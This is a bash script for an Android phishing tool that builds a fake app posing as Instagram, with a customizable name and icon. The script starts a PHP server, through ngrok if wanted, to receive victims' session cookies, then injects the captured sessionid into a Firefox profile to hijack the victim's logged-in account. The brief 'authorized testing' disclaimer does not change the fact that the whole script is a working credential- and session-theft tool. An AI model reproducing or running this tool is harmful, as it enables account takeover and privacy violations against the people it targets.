trap 'printf "\n";stop' 2

stop() {

checkphp=$(ps aux | grep -o "php")

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
exit 1
fi

}

dependencies() {

command -v firefox > /dev/null 2>&1 || { echo >&2 "I require firefox but it's not installed. Install it. Aborting."; exit 1; }
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }

}

banner() {

lazy='\\'
printf "        \e[91m __      __.__         \e[0m\e[93m___________             \e[0m\n"
printf "        \e[91m/  \    /  \__|_______ \e[0m\e[93m\_   _____/__.__. ____  \e[0m\n"
printf '        \e[91m\   \/\/   /  \___   / \e[0m\e[93m |    __)<   |  |/ __ \ \e[0m\n'
printf '        \e[91m \        /|  |/    /  \e[0m\e[93m |        \___  \  ___/ \e[0m\n'
printf "        \e[91m  \__/\  / |__/_____ \ \e[0m\e[93m/_______  / ____|\___  >\e[0m\n"
printf "        \e[91m       \/           \/ \e[0m\e[93m        \/\/         \/ \e[0m\n"
printf "\n"
printf " \e[1;77m.::\e[0m\e[1;93m Android Phishing login credentials with session cookies \e[0m\e[1;77m::.\e[0m\n"                              
printf "\n"
printf "        \e[1;91m Disclaimer: this tool is designed for security\n"
printf "         testing in an authorized simulated cyberattack\n"
printf "         Attacking targets without prior mutual consent\n"
printf "         is illegal!\n\n"

}

createmain() {

if [[ ! -d app/app/src/main/java/com/wizeye/ ]]; then
mkdir -p app/app/src/main/java/com/wizeye/
fi

sed s+choose_url+$url+g app/mainactivity.java | sed s+forwarding+$host+g > app/app/src/main/java/com/wizeye/MainActivity.java


}


insta_cookies() {


command -v sqlite3 > /dev/null 2>&1 || { echo >&2 "I require sqlite3 but it's not installed. Install it. Aborting."; exit 1; }

if [ -f ~/.mozilla/firefox/*.inject/cookies.sqlite ]; then

find ~/.mozilla/firefox/*.inject/ -name "cookies.sqlite" -exec mv '{}' cookies.sqlite.backup \;

else
firefox -CreateProfile inject
fi



printf "\e[92m[\e[0m\e[77m+\e[0m\e[92m] Creating Firefox Profile\e[0m\n"
printf "\e[92m[\e[0m\e[77m+\e[0m\e[92m] Creating cookies database...\e[0m\n"
sleep 2
killall -9 firefox-esr > /dev/null 2>&1
firefox -headless -P inject https://www.instagram.com/ > /dev/null 2>&1 &
sleep 10
killall -9 firefox-esr > /dev/null 2>&1
sleep 3
printf "\e[1;77m[\e[0m\e[92m+\e[0m\e[1;77m] Injecting Cookies...\e[0m\n"
sessionid=$(grep -o sessionid=.*\; uploadedfiles/cookies.txt | cut -d '=' -f2 | cut -d ';' -f1)
sleep 1
timestamp_mili=$(date +%s%6N)
timestamp_exp=$(($(date +%s)+31556952))

echo "INSERT INTO moz_cookies VALUES(6,'instagram.com','','sessionid','$sessionid','.instagram.com','/','$timestamp_exp','$timestamp_mili','$timestamp_mili',1,1,0,0);" | sqlite3 ~/.mozilla/firefox/*.inject/cookies.sqlite

printf "\e[1;77m[\e[0m\e[92m+\e[0m\e[1;77m] Opening Firefox with Instagram Session, please wait\e[0m\n"
sleep 2
firefox -P inject https://www.instagram.com/ > /dev/null 2>&1
stop
}


checkrcv() {



printf "\n"

printf "\e[92m[\e[0m\e[77m*\e[0m\e[92m] Waiting Cookies,\e[0m\e[77m Press Ctrl + C to exit...\e[0m\n"

if [ -f uploadedfiles/cookies.txt ]; then
cat uploadedfiles/cookies.txt >> uploadedfiles/backup.cookies.txt
rm -rf uploadedfiles/cookies.txt
fi

while [ true ]; do

if [[ -e Log.log ]]; then
printf "\e[92m[\e[0m\e[77m*\e[0m\e[92m] Cookie Received!\e[0m\e[77m Saved: app/uploadedfiles/\e[0m\n"
sessionid=$(grep -o sessionid=.*\; uploadedfiles/cookies.txt | cut -d '=' -f2 | cut -d ';' -f1)
printf "\e[77m\n"
cat uploadedfiles/cookies.txt
printf "\e[0m\n"
printf "\e[93m[\e[0m\e[77m+\e[0m\e[93m] Press Ctrl + C when an autenticated session is found\e[0m\n"
if [[ $sessionid != "" ]]; then
printf "\n\e[92m[\e[0m\e[77m+\e[0m\e[92m] Instagram Session Found!\e[0m\n"
insta_cookies
break
fi
 
rm -rf Log.log
fi
done 

}



checkapk() {
if [[ -e app/app/build/outputs/apk/app-release-unsigned.apk ]]; then

printf "\e[77m[\e[0m\e[92m+\e[0m\e[77m] Build Successful, Signing APK...\e[0m\n"

mv app/app/build/outputs/apk/app-release-unsigned.apk app.apk
echo "      " | apksigner sign --ks key.keystore  app.apk > /dev/null

printf "\e[77m[\e[0m\e[92m+\e[0m\e[77m] Done!\e[0m\e[92m Saved:\e[0m\e[77m app/app.apk \e[0m\n"
fi

}


website() {

default_url="https://www.instagram.com"
printf '\e[77m[\e[0m\e[92m+\e[0m\e[77m] Choose a Website (Default:\e[0m\e[92m %s \e[0m\e[77m): \e[0m' $default_url
read url
url="${url:-${default_url}}"

default_appname="Instagram"
printf '\e[77m[\e[0m\e[92m+\e[0m\e[77m] App Name (Default:\e[0m\e[92m %s \e[0m\e[77m): \e[0m' $default_appname
read appname
appname="${appname:-${default_appname}}"
sed 's+appname+'$appname'+g' app/strings.xml > app/app/src/main/res/values/strings.xml

default_appicon="app/app/src/main/res/drawable/insta.png"
printf '\e[77m[\e[0m\e[92m+\e[0m\e[77m] Icon path (Default:\e[0m\e[92m %s \e[0m\e[77m): \e[0m' $default_appicon
read appicon
appicon="${appicon:-${default_appicon}}"

if [[ ! -f $appicon ]]; then
printf "\e[91m[!] File not found!\n\e[0m"
website
else
t=$(basename "$appicon")
name=$(echo "$t" | sed -e 's/\.[^.]*$//')

if [[ "$appicon" != "$default_appicon" ]];then
cp $appicon app/app/src/main/res/drawable/ 
fi
sed 's+app_icon+'$name'+g' app/manifest.xml > app/app/src/main/AndroidManifest.xml
fi

createmain

}



serverlocalhost() {

default_start_php="Y"
read -p $'\n\e[77m[\e[0m\e[92m+\e[0m\e[77m]\e[0m\e[93m Start php localhost server?\e[0m\e[77m [Y/n]\e[0m\e[93m: \e[0m' start_php
start_php="${start_php:-${default_start_php}}"
if [[ $start_php == "Y" ]] || [[ $start_php == "y" ]]; then

read -p $'\e[77m[\e[0m\e[92m+\e[0m\e[77m]\e[0m\e[93m LPORT:\e[0m' lport

if [[ -z $lport ]];then
exit 1
fi
printf '\e[77m[\e[0m\e[92m+\e[0m\e[77m] Starting php server (\e[0m\e[92m %s:%s \e[0m\e[77m)... \e[0m' $localhost $lport
php -S 0.0.0.0:$lport > /dev/null 2>&1 &
if [[ -e Log.log ]]; then
rm -rf Log.log
fi
checkrcv
else
exit 1
fi
}

configureapp() {

localhost=$(hostname -I)
if [[ $localhost == "" ]]; then
localhost="localhost"
fi
printf "\e[92m[\e[0m\e[77m+\e[0m\e[92m]\e[0m\e[93m Example using localhost:\e[0m\n"
#printf "   \e[77m Start Server: \e[0m\e[92m php -c php.ini -S %s:4444 \e[0m\n" $localhost
printf "   \e[77m Web Server: \e[0m\e[92m http://%s:4444 \e[0m\n" $localhost

printf "\e[92m[\e[0m\e[77m+\e[0m\e[92m]\e[0m\e[93m Example using ngrok:\e[0m\n"

printf "   \e[77m Start Server: \e[0m\e[92m ./ngrok http 4444; php -c php.ini -S %s:4444 \e[0m\n" $localhost
printf "   \e[77m Web Server: \e[0m\e[92m https://*.ngrok.io \e[0m\n"


read -p $'\n\e[77m[\e[0m\e[92m+\e[0m\e[77m]\e[0m\e[93m Web Server \e[0m\e[77m(http(s)://ip:port): \e[0m' host

if [[ -z $host ]]; then
exit 1
fi

website
printf "\n\e[92m[\e[0m\e[77m+\e[0m\e[92m] Configuring App...\e[0m\n"

if [[ ! -d uploadedfiles/ ]]; then
mkdir uploadedfiles
fi
printf "\e[92m[\e[0m\e[77m+\e[0m\e[92m] App Configured. Build app/ folder using Android Studio.\e[0m\n"

serverlocalhost

}

banner
dependencies
configureapp
